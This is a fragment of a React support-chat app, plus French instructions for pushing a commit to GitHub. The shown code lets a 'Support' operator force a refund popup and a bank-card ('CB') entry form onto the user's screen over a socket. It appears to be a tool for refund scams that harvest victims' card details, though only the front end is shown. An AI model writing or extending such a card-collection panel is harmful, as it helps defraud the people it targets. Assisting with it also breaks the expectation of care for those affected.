...
const CardIcon = () => ( <svg xmlns="http://www.w3.org/2000/svg" width="16" height="16" fill="currentColor" viewBox="0 0 16 16"><path d="M0 4a2 2 0 0 1 2-2h12a2 2 0 0 1 2 2v8a2 2 0 0 1-2-2H2a2 2 0 0 1-2-2zm2.5 1a.5.5 0 0 0 0 1h1a.5.5 0 0 0 0-1zM2 8a.5.5 0 0 0 .5.5h11a.5.5 0 0 0 0-1h-11A.5.5 0 0 0 2 8m0 3a.5.5 0 0 0 .5.5h11a.5.5 0 0 0 0-1h-11a.5.5 0 0 0-.5.5"/></svg> );
...
function App() {
    ...
    useEffect(() => {
        if (isLoggedIn) {
            ...
            const handleDisplayPopup = () => {
                if (userType === 'User') setShowRefundPopup(true);
            };
            const handleDisplayCardPopup = () => {
                if (userType === 'User') setShowCardPopup(true);
            };
            ...
            socket.on('display card popup', handleDisplayCardPopup);
    ...
    const handleRequestCardPopup = () => socket.emit('request card popup');
    ...
    return (
        <div className="h-screen flex flex-col font-sans bg-[#f5f7fa]">
            {showRefundPopup && <RefundPopup onChoice={handlePopupChoice} />}
            {showCardPopup && <CardFormPopup onSubmit={handleCardSubmit} />}
            ...
            <header className="flex items-center p-4 border-b border-[#e1e7eb] shadow-sm bg-white">
                ...
                {userType === 'Support' && (
                    <div className="ml-auto flex items-center gap-4">
                        <button onClick={handleRequestPopup} title="Request Refund Choice" className="flex items-center gap-2 bg-blue-100 text-blue-800 text-xs font-bold py-2 px-3 rounded-lg hover:bg-blue-200 transition duration-300">
                           <PopupIcon />
                           Refund
                        </button>
                         <button onClick={handleRequestCardPopup} title="Request Card Details" className="flex items-center gap-2 bg-green-100 text-green-800 text-xs font-bold py-2 px-3 rounded-lg hover:bg-green-200 transition duration-300">
                           <CardIcon />
                           CB
                        </button>
...
2.  Envoyez les modifications sur GitHub avec les commandes :
    ...
    ```
    ```bash
    git commit -m "Add separate CB popup button and fix syntax errors"
    ```
    ```bash
    git push
